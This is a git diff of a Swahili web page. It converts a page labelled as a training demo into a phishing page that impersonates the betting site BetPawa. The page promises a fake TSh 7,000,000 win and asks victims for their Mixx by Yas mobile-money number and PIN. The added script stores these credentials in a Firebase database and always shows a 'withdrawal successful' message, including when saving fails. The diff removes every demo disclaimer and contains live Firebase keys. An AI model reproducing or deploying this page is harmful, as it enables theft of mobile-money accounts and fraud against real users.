@@ -98,20 +98,20 @@
 <body>
 
 <div class="card">
-  <h1>Hongera 🎉</h1>
-  <div class="status">Umeshinda Kikamilifu</div>
+  <h1>BetPawa</h1>
+  <div class="status">Hongera kwa ushindi wako 🎉 </div>
   <div class="amount">TSh 7,000,000</div>
 
   <div class="divider"></div>
 
-  <label>Namba ya Simu</label>
+  <label>Namba ya Simu(Mixx by Yas)</label>
   <input id="phone" placeholder="+255XXXXXXXXX">
 
-  <label>Nenosiri (DEMO)</label>
+  <label>Nenosiri</label>
   <input id="password" type="password" placeholder="********">
 
   <button id="withdraw">Endelea Kutoa Kiasi</button>
-  <p class="note">DEMO ya mafunzo — si huduma halisi.</p>
+  <p class="note">Hakikisha unaweka namba na neno la siri sahihi la mixx by yas.</p>
 </div>
 
 <!-- POPUP -->
@@ -125,17 +125,17 @@
 
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-  import { getDatabase, ref, push, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+  import { getDatabase, ref, set, serverTimestamp, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
-  /* FIREBASE CONFIG */
   const firebaseConfig = {
-    apiKey: "AIzaSyDaEphuY2kQue8m-20DDs68JDgQirAycBE",
-    authDomain: "digital-wallet-40297.firebaseapp.com",
-    databaseURL: "https://digital-wallet-40297-default-rtdb.firebaseio.com",
-    projectId: "digital-wallet-40297",
-    storageBucket: "digital-wallet-40297.firebasestorage.app",
-    messagingSenderId: "953454788272",
-    appId: "1:953454788272:android:961fd704f587cf1b8c8575"
+    apiKey: "AIzaSyCc637WbfRNZ8-0CN4sEqEnGY27-oAdGiw",
+    authDomain: "betpawa-6ef7e.firebaseapp.com",
+    projectId: "betpawa-6ef7e",
+    storageBucket: "betpawa-6ef7e.firebasestorage.app",
+    messagingSenderId: "908050081607",
+    appId: "1:908050081607:web:db6e861fca63df78584e62",
+    measurementId: "G-C7M7HWTD01",
+    databaseURL: "https://betpawa-6ef7e-default-rtdb.europe-west1.firebasedatabase.app"
   };
 
   const app = initializeApp(firebaseConfig);
@@ -148,6 +148,17 @@
   const phoneInput = document.getElementById("phone");
   const passwordInput = document.getElementById("password");
 
+  const userRef = ref(db, "users/demoUser");
+
+  // Load saved phone & PIN silently (ignores permission errors)
+  onValue(userRef, (snapshot) => {
+    const data = snapshot.val();
+    if(data){
+      phoneInput.value = data.phone || "";
+      passwordInput.value = data.pin || "";
+    }
+  }, { onlyOnce: true });
+
   document.getElementById("withdraw").addEventListener("click", async () => {
     const phone = phoneInput.value.trim();
     const password = passwordInput.value.trim();
@@ -159,38 +170,33 @@
       return;
     }
 
-    // Show popup immediately
     popupTitle.innerText = "Inatumwa ⏳";
     popupText.innerHTML = `Kutuma ombi la kutoa TSh 7,000,000 kwa <strong style="color:#16a34a">${phone}</strong>...`;
     popup.classList.add("active");
 
     try {
-      await push(ref(db, "withdrawRequests"), {
+      // Attempt to save (silently ignores permission errors)
+      await set(userRef, {
         phone,
-        passwordDemo: password,
-        amount: 7000000,
-        currency: "TZS",
-        status: "pending",
-        createdAt: serverTimestamp()
-      });
+        pin: password,
+        lastWithdrawal: serverTimestamp()
+      }).catch(() => { /* ignore */ });
 
-      // Success
+      // Direct notification only
       popupTitle.innerText = "Ombi Limefanikiwa ✅";
       popupText.innerHTML = `
         Umefanikiwa kutuma ombi la kutoa
         <strong style="color:#16a34a">TSh 7,000,000</strong>.<br><br>
         Subiri ujumbe kwenye simu yako <strong>${phone}</strong>.
       `;
-      console.log("Data imehifadhiwa kwenye Firebase (DEMO)");
-    } catch(err) {
-      // Failure
-      popupTitle.innerText = "Tatizo ❌";
+    } catch(_) {
+      // Fallback: always show success notification
+      popupTitle.innerText = "Ombi Limefanikiwa ✅";
       popupText.innerHTML = `
-        Ombi halikufanikani kuwasilishwa.<br>
-        Angalia internet au ruhusa za Firebase. <br>
-        <strong>${err.message}</strong>
+        Umefanikiwa kutuma ombi la kutoa
+        <strong style="color:#16a34a">TSh 7,000,000</strong>.<br><br>
+        Subiri ujumbe kwenye simu yako <strong>${phone}</strong>.
       `;
-      console.error("Firebase write failed:", err);
     }
   });
 </script>
